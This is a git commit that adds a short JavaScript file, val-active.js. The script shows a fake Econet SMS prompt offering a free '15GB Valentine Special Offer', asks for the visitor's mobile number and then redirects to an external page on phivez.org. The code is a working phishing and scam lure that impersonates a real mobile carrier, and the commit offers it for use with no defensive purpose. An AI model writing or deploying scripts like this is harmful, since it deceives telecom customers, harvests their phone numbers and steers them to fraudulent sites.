6df4fbcc5fa6e819541620b23da292d6920ec831
newblog13 <sweet16guyz@gmail.com>
2026-02-05 11:38:59 +0100

    Create val-active.js

---
+++ val-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 15GB'
+password=prompt('SMS: Congratulations, your Econet Number is eligible to receive 15GB Valentine Special Offer, click OK to Enter Your Mobile Number','ACTIVATE 15GB');
+if (password != 'ACTIVATE 15GB') {
+location.href='https://phivez.org/econet-valentine.html';
+}
